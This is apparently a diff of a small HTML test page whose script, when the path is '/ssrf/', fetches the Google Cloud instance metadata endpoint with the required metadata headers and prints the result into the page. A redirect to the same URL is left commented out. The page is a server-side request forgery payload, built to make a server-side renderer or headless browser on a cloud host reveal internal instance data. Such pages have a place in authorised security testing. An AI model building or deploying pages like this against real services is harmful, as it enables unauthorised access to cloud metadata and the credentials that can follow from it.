@@ -1,29 +1,43 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Your Website Title</title>
-    <!-- other head elements -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Test Redirect with Fetch</title>
+    <style>
+        /* Add your CSS styling here */
+        #responseData {
+            margin-top: 20px;
+            border: 1px solid #ddd;
+            padding: 10px;
+            background-color: #f9f9f9;
+        }
+    </style>
 </head>
 <body>
-    <!-- your website's body content -->
+    <h1>Welcome to the Test Page</h1>
+    <div id="responseData">Response will appear here...</div>
 
     <script>
         document.addEventListener('DOMContentLoaded', (event) => {
             if (window.location.pathname === '/ssrf/') {
                 fetch('http://metadata/computeMetadata/v1/instance/id', {
-    method: 'GET',
-    headers: {
-        'Metadata-Flavor': 'Google',
-        'X-Google-Metadata-Request': 'True'
-    }
-})
-.then(response => response.text()) // or response.json() if JSON response
-.then(data => {
-    console.log(data); // Process the response data
-    window.location.href = 'http://metadata/computeMetadata/v1/instance/id'; // Then redirect
-})
-.catch(error => console.error('Error:', error));
-
+                    method: 'GET',
+                    headers: {
+                        'Metadata-Flavor': 'Google',
+                        'X-Google-Metadata-Request': 'True'
+                    }
+                })
+                .then(response => response.text()) // Assuming the response is text
+                .then(data => {
+                    document.getElementById('responseData').innerText = data;
+                    // Uncomment the line below to redirect after displaying the data
+                    // window.location.href = 'http://metadata/computeMetadata/v1/instance/id';
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('responseData').innerText = 'Error fetching data';
+                });
             }
         });
     </script>
